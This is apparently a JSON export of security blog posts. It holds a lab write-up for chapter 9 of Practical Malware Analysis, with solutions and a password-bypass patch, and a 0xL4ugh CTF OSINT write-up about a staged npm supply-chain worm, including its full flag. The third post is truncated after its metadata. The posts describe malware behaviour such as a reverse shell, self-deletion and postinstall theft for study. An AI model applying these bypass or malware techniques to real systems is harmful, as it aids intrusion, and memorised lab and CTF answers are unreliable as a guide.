[
  {
    "id": "/post/2024-05-1-pmach9",
    "slug": "2024-05-1-pmach9",
    "title": "Chapter-9 PMA Write-up",
    "description": "A solution to chapter-9 lab from (Practical Malware Analysis) Book",
    "date": "February 9, 2026",
    "readTime": "11 min read",
    "tags": [
      "Malware"
    ],
    "category": "Tutorials & Labs",
    "imageUrl": "/assets/images/Tutorials-Labs/PMAch10/9-1-a.png",
    "content": "<h1><span style=\"color:#004F98;\"><strong>Lab 9-1 :</strong></span></h1>\n<p> Analyze the malware found in the file Lab09-01.exe using x64dbg and IDA-Pro to answer the following questions. This malware was initially analyzed in \nthe Chapter 3 labs using basic static and dynamic analysis techniques.</p>\n<p><strong>Questions</strong></p>\n<ol>\n<li>How can you get this malware to install itself?</li>\n<li>What are the command-line options for this program? What is the password requirement?</li>\n<li>How can you use x64dbg to permanently patch this malware, so that it \ndoesn’t require the special command-line password?</li>\n<li>What are the host-based indicators of this malware?</li>\n<li>What are the different actions this malware can be instructed to take via \nthe network?</li>\n<li>Are there any useful network-based signatures for this malware?</li>\n</ol>\n<hr>\n<p>From basic analysis we know that:</p>\n<ul>\n<li>It&#39;s a 32-bit PE </li>\n<li>Console app</li>\n<li>MD5: B94AF4A4D4AF6EAC81FC135ABDA1C40C</li>\n<li>SHA256: 6AC06DFA543DCA43327D55A61D0AAED25F3C90CCE791E0555E3E306D47107859</li>\n<li>The binary deletes itself when double clicked.</li>\n</ul>\n<p><strong>Now, let&#39;s open it in IDA.</strong></p>\n<p><strong>Overview</strong>\nAt begining, we see a check for the number of command-line arguments, if it lower than &#39;1&#39; the progrm calls <code>sub_40100</code>, If it&#39;s greater then it calls <code>sub_402510</code></p>\n<p><strong>Note</strong> argc must be greater than 0 as the file name of the program is always counted</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch10/9-1-a.png\" alt=\"alt text\"></p>\n<p><code>sub_40100</code> is calling <code>ShellExeuteA</code> function, but we don&#39;t know which are acutually pushed to it</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch10/9-1-b.png\" alt=\"alt text\"></p>\n<p>We could use x64dbg and breaking on our functionto see what does the function do.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch10/9-1-c.png\" alt=\"alt text\"></p>\n<p>We can see that it uses cmd.exe to execute the following command:</p>\n<pre><code class=\"language-bat\"> /c del C:\\\\Users\\\\husky\\\\Desktop\\\\Lab09-01.exe &gt;&gt; NUL\n</code></pre>\n<p>This command is used to delete the binary, that means that there is some command-line arguments that should be passed to make the binary works.</p>\n<p><strong>Reversing password</strong></p>\n<p>The <code>sub_402510</code> function acts as a password checker, we see 5 comparison that must be satisfied in the last argument &quot;password&quot; so that the program runs.</p>\n<p>After some debugging, We can obtain that the password is\n<span style=\"color:#00F0FA;\"><strong>abcd</strong></span>. </p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch10/9-1-d.png\" alt=\"alt text\"></p>\n<p><strong>Bypassing password</strong></p>\n<p>To patch the malware so that we could bybass the password we may turn every <code>je</code> to <code>jmp</code>.</p>\n<p>An alternative way is that we could simply set eax to &#39;1&#39; then do a <code>ret</code> instruction like that:</p>\n<pre><code class=\"language-Assembly\">B8 01 00 00 00   MOV EAX, 0x1\nC3               RET\n</code></pre>\n<p><strong>Malware options</strong></p>\n<p>Beside the &quot;<strong>password</strong>&quot; there is another argument that specifies which option will be taken.</p>\n<p>After the password checking, the malware compares between the second argument and <code>-in</code>, If it&#39;s true, the program starts to install itself.</p>\n<p>We can find that the other options are being pushed to &quot;mem_comp&quot; function to be compared to our input argument one by one.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch10/cc-option.png\" alt=\"alt text\"> <img src=\"/assets/images/Tutorials-Labs/PMAch10/c-option.png\" alt=\"alt text\"> <img src=\"/assets/images/Tutorials-Labs/PMAch10/in-option.png\" alt=\"alt text\"> <img src=\"/assets/images/Tutorials-Labs/PMAch10/re-option.png\" alt=\"alt text\"></p>\n<p><strong>Note:</strong> <em>&quot;-op1&quot; is the input I used, the other argument to &quot;mem_comp&quot; is the hardcoded option.</em></p>\n<p><strong>The options  are:</strong></p>\n<ol>\n<li><span style=\"color:#00F0FA;\"><strong>-in</strong></span>, Installs the malware.</li>\n<li><span style=\"color:#00F0FA;\"><strong>-re</strong></span>, Removes the malware.</li>\n<li><span style=\"color:#00F0FA;\"><strong>-c</strong></span>, Preforms a post-compromise activity.</li>\n<li><span style=\"color:#00F0FA;\"><strong>-cc</strong></span>, Checks current configuration in registry key.</li>\n</ol>\n<p><span style=\"color:#00F0FA;\"><strong>For self installation,</strong></span> we have to run the malware with 2 arguments &quot;<span style=\"color:#00F0FA;\"><strong>-in</strong></span>&quot; and &quot;<span style=\"color:#00F0FA;\"><strong>abcd</strong></span>&quot;.</p>\n<p><strong>Host-base IOCs</strong></p>\n<ul>\n<li><p>The registry key used to store the malware configuration: <span style=\"color:#00F0FA;\"><strong>HKLM\\SOFTWARE\\Microsoft \\XPS</strong></span>.</p>\n</li>\n<li><p>The service created  the name: &quot;<span style=\"color:#00F0FA;\"><strong>Manager Service</strong></span>.&quot;</p>\n</li>\n<li><p>The presence of a binary at <span style=\"color:#00F0FA\"><strong>%SYSTEMROOT%\\Windows\\System32</strong></span>.</p>\n</li>\n</ul>\n<p><strong>Network actions</strong>\nBy using IDA strings, we can notice some actions that belongs to a connection to the network in the <code>sub_402020</code>, these actions are:</p>\n<ul>\n<li>NOTHING, does nothing</li>\n<li>DOWNLOAD, uploads a file from disk to a web resource.</li>\n<li>UPLOAD, downloads a file from a web resource over a specified port and write it to disk</li>\n<li>SLEEP, puts the malware to sleep for a some milliseconds</li>\n</ul>\n<p><strong>Note</strong>: <em>for upload and download actions, these aren&#39;t types, The <strong>upload</strong> action is  downloading to the host, and the <strong>download</strong> action is uploading to a remote host.</em></p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch10/9-1-e.png\" alt=\"alt text\"></p>\n<p><strong>Network-base IOCs</strong></p>\n<ul>\n<li><code>http://www.practicalmalwareanalysis.com</code> using <strong>HTTP/1.0</strong></li>\n</ul>\n<hr>\n<hr>\n<h1><span style=\"color:#004F98;\"><strong>Lab 9-2 :</strong></span></h1>\n<p>Analyze the malware found in the file Lab09-02.exe using x64dbg to answer \nthe following questions.</p>\n<p> Questions</p>\n<ol>\n<li>What strings do you see statically in the binary?</li>\n<li>What happens when you run this binary?</li>\n<li>How can you get this sample to run its malicious payload?</li>\n<li>What is happening at 0x00401133?</li>\n<li>What arguments are being passed to subroutine 0x00401089?</li>\n<li>What domain name does this malware use?</li>\n<li>What encoding routine is being used to obfuscate the domain name?</li>\n<li>What is the significance of the CreateProcessA call at 0x0040106E?</li>\n</ol>\n<hr>\n<p>From basic analysis we know that:</p>\n<ul>\n<li>It&#39;s a 32-bit PE </li>\n<li>GUI app</li>\n<li>MD5: 251F4D0CAF6EADAE453488F9C9C0EA95</li>\n<li>SHA256: F153DFACEC09DD69809C3BBF68270A38EE3701F44220C7BF181C14A68C138133</li>\n<li>The binary terminates itself when double clicked.</li>\n</ul>\n<p><strong>Exploring strings</strong>\nFirst let&#39;s look at strings using <strong>Floss</strong>:</p>\n<p>Besides the list of importd APIs, there are no interesting strings that \nappear statically in the binary, but floss was able to gather some  decoded strings and stackstrings</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch10/9-2-a.png\" alt=\"alt text\"></p>\n<p><strong>Now, let&#39;s open it in IDA.</strong></p>\n<p>First, we see some values being stored in the stack segment which are corresponding to our previously mentioned stackstrings.</p>\n<p>This is a common string obfuscation technique to make analysis more challenging.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch10/9-2-b.png\" alt=\"alt text\"> </p>\n<p>A while after a call to <code>_strcmp</code> function which compares between 2 arguments <code>str1</code> and <code>str2</code>.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch10/9-2-c.png\" alt=\"alt text\"></p>\n<p>Using x64dbg we can see that the two arguments are <code>ocl.exe</code> and <code>Lab09-02.exe</code></p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch10/9-2-d.png\" alt=\"alt text\"></p>\n<p>If the comparison is true, return value will be &#39;0&#39; and the malware starts it functionality, If false, the the return value is &#39;1&#39; and the malware will terminate itself.</p>\n<p>So, <span style=\"color:#00F0FA;\"><strong>To run the malicious payload</strong></span>, we could change file name to become <code>ocl.exe</code>.</p>\n<p>After that, we see a call to <code>WSAStartup</code> and <code>WSASocketA</code> to initiates a socket conection, then a call to `sub_401089.</p>\n<p>Using x64dbg, we can see that the 2 arguments that are pushed to <code>sub_401089</code> are &quot;<span style=\"color:#00F0FA;\"><strong>0x019FD40</strong></span>&quot;  and &quot;<span style=\"color:#00F0FA;\"><strong>1qaz2wsx3edc</strong></span>&quot;.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch10/9-2-e.png\" alt=\"alt text\"></p>\n<p>The <code>sub_401089</code> acts as a decoding routine to decode the <code>1qaz2wsx3edc</code> and store the result in memory at &quot;<strong>0x019FD40</strong>&quot; , the decoded string is a domain name called <code>http://www.practicalmalwareanalysis.com</code>.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch10/9-2-g.png\" alt=\"alt text\"><br><img src=\"/assets/images/Tutorials-Labs/PMAch10/9-2-f.png\" alt=\"alt text\"></p>\n<p>The encoding routine used to obfuscate the domain name is a <span style=\"color:#00F0FA;\"><strong>XOR</strong></span> routine.</p>\n<p>After that we see a call to <code>gethostbyname</code> and <code>htons</code> to establish the network to a <code>connect</code> API call, If the connection with C2 server was successful, the malware calls <code>sub_401000</code>.</p>\n<p>Inside the <code>sub_401000</code>, we see a called to <code>CreateProcessA</code> API to creates a new process and its primary thread.</p>\n<p>According to <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa\">MSDN Page</a> the parameters to the <code>CreateProcessA</code> enables it to creates a new process with the <code>cmd.exe</code> command line to be executed in a hidden window.</p>\n<p>The standard input, output, and error streams are passed to the established socket to the C2.</p>\n<p> <img src=\"/assets/images/Tutorials-Labs/PMAch10/9-2-h.png\" alt=\"alt text\"></p>\n<p><span style=\"color:#00F0FA;\"><strong>Summary</strong></span></p>\n<p>The malware acts as a Reverse-Shell allowing access to this host, and then establishes a cmd process to receive commands to execute from a C2 server.</p>\n<hr>\n<hr>\n<h1><span style=\"color:#004F98;\"><strong>Lab 9-3 :</strong></span></h1>\n<p> Analyze the malware found in the file Lab09-03.exe using x64dbg and IDA-Pro. \nThis malware loads three included DLLs (DLL1.dll, DLL2.dll, and DLL3.dll) \nthat are all built to request the same memory load location. Therefore, when \nviewing these DLLs in x64dbg versus IDA Pro, code may appear at different \nmemory locations. The purpose of this lab is to make you comfortable with \nfinding the correct location of code within IDA Pro when you are looking at \ncode in x64dbg.</p>\n<p> Questions</p>\n<ol>\n<li>What DLLs are imported by Lab09-03.exe?</li>\n<li>What is the base address requested by DLL1.dll, DLL2.dll, and DLL3.dll?</li>\n<li>When you use x64dbg to debug Lab09-03.exe, what is the assigned based \naddress for: DLL1.dll, DLL2.dll, and DLL3.dll?</li>\n<li>When Lab09-03.exe calls an import function from DLL1.dll, what does \nthis import function do?</li>\n<li>When Lab09-03.exe calls WriteFile, what is the filename it writes to?</li>\n<li>When Lab09-03.exe creates a job using NetScheduleJobAdd, where does it get \nthe data for the second parameter?</li>\n<li>While running or debugging the program, you will see that it prints out \nthree pieces of mystery data. What are the following: DLL 1 mystery \ndata 1, DLL 2 mystery data 2, and DLL 3 mystery data 3?</li>\n<li>How can you load DLL2.dll into IDA Pro so that it matches the load \naddress used by x64dbg?</li>\n</ol>\n<hr>\n<p>From basic analysis we know that:</p>\n<ul>\n<li>It&#39;s a 32-bit PE </li>\n<li>Console app</li>\n<li>MD5: A90B5A068EF610C44F07ABEDDAB37D2A</li>\n<li>SHA256: 1FC6A471B2A46CD882246D5BDC9D5954BF8EFACF68B4E549A9756E6616848884</li>\n<li>The binary prints some mysterious strings when double clicked.</li>\n</ul>\n<p><strong>Now, let&#39;s open it in IDA.</strong></p>\n<hr>\n<p>In imports window, we can see that the binary imports the following DLLs:</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch10/9-3-a.png\" alt=\"alt text\"></p>\n<p>Using <strong>CFF Explorer</strong>, we can see the that all three DLLs request the base-address of <code>0x10000000</code>.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch10/9-3-b.png\" alt=\"alt text\"></p>\n<p>In x64dbg, we can go to <strong>Symbols</strong> window to see that the assigned based-addresses of the three DLLs are loaded as following:</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch10/9-3-c.png\" alt=\"alt text\"></p>\n<p><strong>NOTE that:</strong> <em>DLL3.dll is dynamicly linked which means that we have to execute the <strong>LoadLibraryA</strong> function first to be able to see where it&#39;s been loaded.</em></p>\n<p>Now let&#39;s see what is happening in <strong>main</strong> function, first we see a call to <code>DLL1Print</code> function which is imported from <strong>DLL1.dll</strong>.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch10/9-3-d.png\" alt=\"alt text\"></p>\n<p>To see what it does, we step into it in x64dbg, we see that it calls only one function that prints it&#39;s two parameters <code>DLL 1 mystery data %d</code> the number at the end is the second parameter which is the value in the address of <code>0x10008030</code>.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch10/9-3-e.png\" alt=\"alt text\"></p>\n<p>As there is previous initialization to the value in the address of <code>0x10008030</code>, then it must had been initialize in <strong>DLLMain</strong> so let&#39;s go to it, we see that it is the ID of our current process <code>Lab09-03.exe</code>.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch10/9-3-f.png\" alt=\"alt text\"></p>\n<p>To make sure that we are right, We open <code>Process Hacker</code> to see that the ID of our current process <code>Lab09-03.exe</code> is the same to the printed number.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch10/9-3-gg.png\" alt=\"alt text\"> <img src=\"/assets/images/Tutorials-Labs/PMAch10/9-3-g.png\" alt=\"alt text\"></p>\n<p>Now, let&#39;s get back to <strong>main</strong>:</p>\n<p>After the <strong>DLL1Print</strong> we find a call to <code>DLL2Print</code>, We step into it to see the same function the was implemented in DLL1Print which will print <code>DLL 2 mystery data %d</code>, so we go to DLLMain to see the value in the second parameter.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch10/9-3-h.png\" alt=\"alt text\"></p>\n<p>We see a call to <code>CreateFileA</code> to create a file under the name of <code>temp.txt</code>, which means that it will return an open handle to the specified file, which will be printed to our output later.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch10/9-3-hh.png\" alt=\"alt text\"></p>\n<p>To make sure of that, We open the <strong>Handles</strong> window to see the handel for the <code>temp.txt</code> is <code>EC</code> (236 in decimal) which to equivalent to our output.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch10/9-3-ii.png\" alt=\"alt text\"> <img src=\"/assets/images/Tutorials-Labs/PMAch10/9-3-i.png\" alt=\"alt text\"></p>\n<p>Backing to <strong>main</strong> we see a call to <code>DLL3Print</code> which will also print <code>DLL 3 mystery data %d</code>, this time the seconed parameter refers to the Memory address of <code>ping www.malwareanalysisbook.com</code> which is equivalent to the our output (the parameter in hex and the output is decimal).</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch10/9-3-jj.png\" alt=\"alt text\"> <img src=\"/assets/images/Tutorials-Labs/PMAch10/9-3-j.png\" alt=\"alt text\"></p>\n<p>After that we see a call to <code>GetProcAddress</code> and <code>DLL3GetStructure</code> then a call to <code>NetScheduleJobAdd</code>.</p>\n<p>According to <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/lmat/nf-lmat-netschedulejobadd\">MSDN Page</a>, The <code>NetScheduleJobAdd</code> is used to  submits a job to run at a specified future time and date, it takes 3 parameters:</p>\n<ul>\n<li>Servername</li>\n<li>Buffer</li>\n<li>JobId</li>\n</ul>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch10/9-3-k.png\" alt=\"alt text\"></p>\n<p>The second parameter <code>buffer</code> gets it&#39;s data from the <code>DLL3GetStructure</code> return value, which represents a pointer to an AT_INFO structure describing the job to submit.</p>\n<p>We can load DLL2.dll into IDA Pro in a different location by checking the \nManual Load box when loading the DLL. In the field that says Please specify \nthe new image base, we type <code>0x04E0000</code>.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch10/9-3-l.png\" alt=\"alt text\"></p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch10/9-3-ll.png\" alt=\"alt text\"></p>\n<hr>\n<hr>\n<p align=\"center\"><span style=\"color:#00FFFF;\">THE END</span></p>\n\n\n<hr>\n<hr>\n"
  },
  {
    "id": "/post/0xl4ugh-ctf-v5-dune-osint-challenge",
    "slug": "0xl4ugh-ctf-v5-dune-osint-challenge",
    "title": "DUNE - OSINT Writeup",
    "description": "A detailed writeup for the Dune OSINT challenge from 0xL4ugh CTF V5",
    "date": "January 25, 2026",
    "readTime": "7 min read",
    "tags": [
      "CTF"
    ],
    "category": "CTF Writeups",
    "imageUrl": "/assets/images/Write-Ups/0xL4ugh_ctf_v5/zero-width.png",
    "content": "<h2><span style=\"color:#0056D2;\"><strong>Description</strong></span></h2>\n<pre><code>\n⁣I‌n‍ ⁣t⁣h​e​ ‌w⁤o‌r⁢l﻿d﻿ ⁢o​f​ ‌D⁠u‌n⁠e⁣,⁣ ⁤e‍v​e⁣r⁤y⁠t‌h​i﻿n⁢g‌ ‌h⁣a‌s﻿ ​t⁢w‍o​ ⁤f﻿a‌c‍e⁢s⁣ ⁣d​e﻿p​e﻿n‌d‌i⁤n⁠g⁢ ﻿o⁢n‌ ​w​h⁤o⁣ ⁢y⁢o⁢u⁢ ⁤a⁤r​e⁢.‍\n⁠A⁣ ⁢F⁣r⁤e⁠m⁣e⁠n‍ ‍c⁣a‍n⁢ ⁢b⁣e﻿ ﻿a⁠ ⁣t​r⁤u‌s‌t⁢e⁣d​ ‌a﻿l‍l﻿y​ ​t⁤o‌ ​H​o‌u﻿s﻿e⁤ ‌A‌t‌r​e​i﻿d‍e⁣s﻿…​ ⁤o⁣r⁣ ⁣a﻿ ﻿n⁤i‌g⁢h⁢t⁤m‍a⁢r‌e‌ ﻿t⁤o⁠ ​H⁣o⁣u⁠s﻿e​ Harkonnen.\n\nIn the last cycles, our largest automation colony, Arrakis-colony, was hit by a so-called Sand Worm.\nThe harvesters stalled, telemetry went wild and, worst of all, Secrets were stolen.\n\nYour mission is to help us understand what really happened – and recover what was taken.\n\nFind our official Presence on the Open Web.\n\nFrom there, track down where we keep our harvesters’ Source Code.\nSomewhere in those spice Packages you will see what the sand beast did to us.\n\nRumours say that someone has already seen a piece of our secrets and left traces of it behind.\nWe need you to confirm or deny this, and follow the trail as it moves across dunes.\n\nBe aware of the Many Fakes, If you read the signs correctly and follow every breadcrumb, you’ll uncover all stolen fragments.\n\nFlag format\nThe recovered secret is split into three parts:\n\n&gt; 0xL4ugh{part-1part-2part-3}\n\n(no spaces).\n</code></pre>\n<h2><span style=\"color:#0056D2;\"><strong>Keywords</strong></span></h2>\n<p>From the description, we find some interesting keywords:</p>\n<pre><code>Arrakis-Colony\nSand Worm\nSecrets were stolen\nPresence on the Open Web\nSource Code\nPackages\nMany Fakes\n</code></pre>\n<p>Trying some steganography on the description, the <strong><code>Zero-Width Characters</code></strong> results in the following flag:</p>\n<p><img src=\"/assets/images/Write-Ups/0xL4ugh_ctf_v5/zero-width.png\" alt=\"zero-width.png\"></p>\n<p>This flag is the first of almost 14 fake flags distributed across different areas throughout the whole challenge to prevent rabbit-holes and make you stick to the desired path, so if you found one, that means you took a wrong turn, take a step back and think smarter.</p>\n<h2><span style=\"color:#0056D2;\"><strong>Web Fragments</strong></span></h2>\n<p>From those keywords, we start searching the open web for any presence of <code>Arrakis-Colony</code>, I used multiple search dorks on different browsers, including <code>bing</code>, <code>yandex</code>, <code>Google</code>, <code>yahoo</code> and even <code>DuckDuckGo</code>, I used dorks like:</p>\n<pre><code>- &quot;Arrakis-colony&quot;\n- &quot;Arrakis colony&quot; &quot;Packages&quot;\n- &quot;Sand Worm&quot; &quot;0xL4ugh-CTF&quot;\n- ...\n</code></pre>\n<p>there was absolutely nothing until this dork worked on Google:</p>\n<p><img src=\"/assets/images/Write-Ups/0xL4ugh_ctf_v5/google_dork_matched.png\" alt=\"alt text\"></p>\n<p>The website is intentionally configured so that only Google indexes it reliably, other search engines either don’t index it or are very slow to pick it up.</p>\n<p>Now that we have the <code>Arrakis-Colony</code>’s official presence on the Open Web, we search the whole website til we find the contact-us section which has links for <a href=\"https://github.com/arrakis-flows\">GitHub</a>, <a href=\"https://www.linkedin.com/in/duke-of-arrakis/\">LinkedIn</a> and <a href=\"https://t.me/Duke_of_arrakis_bot\">Telegram</a>, the keywords had <code>Source Code</code> and<code>Packages</code> so we start with GitHub.</p>\n<h2><span style=\"color:#0056D2;\"><strong>GitHub</strong></span></h2>\n<p>Viewing the repositories, we see that there are 5 repos, 3 NPM packages and 2 odd repos.</p>\n<p><img src=\"/assets/images/Write-Ups/0xL4ugh_ctf_v5/repositories.png\" alt=\"alt text\"></p>\n<p>Further investigation shows odd commits in <code>arrakis-spice-connector</code> repo, two files were added.</p>\n<p><code>package.js</code> which uses postinstall to install <code>setup_spice_telemetry.js</code>, which does some odd loggings staff.</p>\n<p>After some search we find out that this is very similar to the recent <em><strong>Shai Hulud 2.0 Supply-Chain Attack</strong></em> that took place in <em><strong>November 24</strong></em>  this year.</p>\n<p>Based on this <a href=\"https://www.aikido.dev/blog/shai-hulud-strikes-again-hitting-zapier-ensdomains\">report</a>, the <code>Shai Hulud</code> is a worm that installs bun with the file <code>setup_bun.js</code> and then uses that to execute <code>bun_environment.js</code> which is the actual malicious code then creates a randomly named repository with stolen data</p>\n<p>the malware also publishes secrets to GitHub, with a random name and the repository description: <code>Sha1-Hulud: The Second Coming.</code></p>\n<p>So, the repo <strong>arrakis-spice-connector</strong> is infected with the <strong>shai hulud</strong> worm, this is what the challenge description meant by Sand-worm/Sand-beast, this also explains the previous 2 odd repos, they were generated by the worm. but the odd thing is that the worm usually makes repos with the description <code>Sha1-Hulud: The Second Coming.</code> when successful, but that didn’t happen here, we have <code>Sha1-Hulud: Broken Dream</code> and <code>Sha1-Hulud: The First Coming</code> but no <code>Sha1-Hulud: The Second Coming.</code>, also the <code>setup_spice_telemetry.js</code> code has this:</p>\n<pre><code class=\"language-jsx\">  log(&quot;Archive route: github.com/arrakis-flows/sietch-secrets-archive&quot;);  \n  log(&quot;Echo hint: Second dream of Arrakis.&quot;);\n</code></pre>\n<p>But this repo doesn’t exist!</p>\n<p>The description says that <em><strong>someone has already seen a piece of our secrets and left traces of it behind</strong></em></p>\n<h2><span style=\"color:#0056D2;\"><strong>Web Archive</strong></span></h2>\n<p>By checking common web archives like <code>archive.is</code> and the <code>Wayback Machine</code> for any traces of the missing repo we find this <a href=\"https://archive.is/https://github.com/orgs/arrakis-flows/repositories\">snapshot</a>, which indicates the previous existence of the desired repo.</p>\n<p><img src=\"/assets/images/Write-Ups/0xL4ugh_ctf_v5/archive-1.png\" alt=\"alt text\"></p>\n<p>Maybe these <code>guild-navigator-logs</code> and <code>tleilaxu-telemetry-dump</code> repos were failed tries and the <code>sietch-secrets-archive</code> was the successful one.</p>\n<p>We search for any other snapshots for this directory using wildcards to find another <a href=\"https://archive.is/https://github.com/arrakis-flows/*\">3 snapshots</a>, one of them has this path within the repo</p>\n<pre><code>sietch-secrets-archive/blame/main/logs/spice_scan.log\n</code></pre>\n<p>opening it, we see this:</p>\n<p><img src=\"/assets/images/Write-Ups/0xL4ugh_ctf_v5/archive-2.png\" alt=\"alt text\"></p>\n<p>Decrypting it using <a href=\"https://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=Umt4QlJ5MHRVRUZTVkMweE9pQlRTRUV4WDBoVlRGVkU\">cyberchef</a></p>\n<p><img src=\"/assets/images/Write-Ups/0xL4ugh_ctf_v5/part-1.png\" alt=\"alt text\"></p>\n<h2><span style=\"color:#0056D2;\"><strong>Back to Beginning</strong></span></h2>\n<p>Since we already pulled everything GitHub-related, we take a step back to the website, we get back to contact us section and go for the <a href=\"https://www.linkedin.com/in/duke-of-arrakis/\">LinkedIn page</a>, we see only one post there:</p>\n<p><img src=\"/assets/images/Write-Ups/0xL4ugh_ctf_v5/linkedin-post.png\" alt=\"alt text\"></p>\n<h2><span style=\"color:#0056D2;\"><strong>Reddit of the Dark Web</strong></span></h2>\n<p>We need to find that thread, we search for that <code>Reddit of the dark web</code> forum to find out that it’s actually <code>Dread</code>, so we setup our Tor browser and go there searching for it.</p>\n<p>After some searching, we encounter this <a href=\"https://dreadytofatroptsdj6io7l3xptbet6onoyno2yv7jicoxknyazubrad.onion/post/2d6aeef3b3aa4b50e584\">comment</a> on the mentioned thread:</p>\n<p><img src=\"/assets/images/Write-Ups/0xL4ugh_ctf_v5/dread_pending_thread.png\" alt=\"alt text\"></p>\n<blockquote>\n<p>Useless Note <code>ㄟ( ▔, ▔ )ㄏ</code></p>\n<p>   <em>The thread is posted by <code>Duke_of_Arrakis</code> who is <code>Paul Atriedes</code> if you’re a fan of the dune world</em></p>\n<p>   <em>But that doesn’t change anything.</em></p>\n</blockquote>\n<p>Using <a href=\"https://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)ROT13(true,true,false,13)&input=IFZURnNUMVpETUhSUk1EVkdVbmt3ZVU5cFFtWmhhbEp0V0hwU2FGaDZSalpaZWtKdFducE9iQT09IA\">cyberchef</a> again to decrypt the second part will result in:</p>\n<p><img src=\"/assets/images/Write-Ups/0xL4ugh_ctf_v5/part-2.png\" alt=\"alt text\"></p>\n<h2><span style=\"color:#0056D2;\"><strong>Sample Hunting</strong></span></h2>\n<p>From the previous thread, we found some IOCs for a sample, the sample contained the string <em><strong>Part-3</strong></em> indicating that it has the rest of the flag.</p>\n<p>Searching with the hash on <code>MalwareBazaar</code> will result in this <a href=\"https://bazaar.abuse.ch/sample/6605d218eafede3708c81a86580e51a7ccd072e0231c47692e9dc1ac0e90f2c6/\">sample</a>, which has the following tags indicating it’s our desired sample.</p>\n<p><img src=\"/assets/images/Write-Ups/0xL4ugh_ctf_v5/malware_bazzar.png\" alt=\"alt text\"></p>\n<p>The sample is intentionally crafted for this CTF, it is flagged as malware on VT and similar services for realism.</p>\n<p><strong>Still, handle it in a VM.</strong></p>\n<p><img src=\"/assets/images/Write-Ups/0xL4ugh_ctf_v5/VT.png\" alt=\"alt text\"></p>\n<p>Running the sample will result in this output in the shell before deleting itself:</p>\n<p><img src=\"/assets/images/Write-Ups/0xL4ugh_ctf_v5/running_sample.gif\" alt=\"alt text\"></p>\n<h2><span style=\"color:#0056D2;\"><strong>Do We Need Reversing?</strong></span></h2>\n<p>Actually no, you can just upload the sample to any sandbox and see what it does or search for the string <code>Part-3</code>:</p>\n<p><img src=\"/assets/images/Write-Ups/0xL4ugh_ctf_v5/sandbox_result.png\" alt=\"alt text\"></p>\n<p>But this is not what I would do.</p>\n<p>This means it’s <code>IDA</code> time; I opened the strings tab then tracked where the <code>Part-3</code> string was used in the decompiled code; it was <code>RegCreateKeyExA</code> followed by <code>RegSetValueExA</code> and <code>RegCloseKey</code>, so we put a breakpoint there and inspect the value in the ‘string’ variable.</p>\n<p><img src=\"/assets/images/Write-Ups/0xL4ugh_ctf_v5/break_point.png\" alt=\"alt text\"></p>\n<p>Verifying this in regedit will result in this:</p>\n<p><img src=\"/assets/images/Write-Ups/0xL4ugh_ctf_v5/regedit.png\" alt=\"alt text\"></p>\n<p>Back to <a href=\"https://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)ROT13(true,true,false,13)&input=VlRGc1QxWkRNSFJSTURWR1Vua3dlazlwUW1aaGFrWnVaRlk1ZWs1SVozcFlNMjh3WlZkdk1GcFVUbVphZWtGMw\">cyberchef</a> again to decode the last part:</p>\n<p><img src=\"/assets/images/Write-Ups/0xL4ugh_ctf_v5/part-3.png\" alt=\"alt text\"></p>\n<h2><span style=\"color:#0056D2;\"><strong>Full Flag</strong></span></h2>\n<p><span style=\"color:#55f0f0;\"><strong>0xL4ugh{SHA1_HULUD_w4s_4n_1mp0st3r_w1th_f4k3_m4lw4r3_t00}</strong>\n</span></p>\n<h2><span style=\"color:#0056D2;\"><strong>What we really learned?</strong></span></h2>\n<ol>\n<li><p>Not everything archived in wayback machine, you can always find solid data in other archives as well.</p>\n</li>\n<li><p>Understanding search queries for dark forums like <code>Dread</code> is a must for any real OSINTer [the hint made it too easy for you].</p>\n</li>\n<li><p>Threat-Intel platforms are always useful for real-case scenarios.</p>\n</li>\n</ol>\n<hr>\n<h2><span style=\"color:#0056D2;\"><strong>Conclusion</strong></span></h2>\n<p>At the end, I hope you have learned something from this challenge and had some fun.</p>\n<p>I also hope you didn’t curse my name for all those fake flags <code>¯\\_(ツ)_/¯</code></p>\n<hr>\n<hr>\n<pre><code>                                                                              THE END\n</code></pre>\n<hr>\n<hr>\n"
  },
  {
    "id": "/post/victoris4-finals-osint",
    "slug": "victoris4-finals-osint",
    "title": "OSINT Writeup — IEEE VICTORIS4 CTF Finals",
    "description": "After a full 6 hours in the `IEEE VICTORIS4 CTF` finals phase, I’m happy to share my write-up for three OSINT challenges I created: two Investigations (*Easy/Medium*) and one Geo (*Hard*), this is a step-by-step walkthrough aimed at beginners.",
    "date": "September 30, 2025",
    "readTime": "6 min read",
    "tags": [
      "CTF"
    ],
    "category": "CTF Writeups",
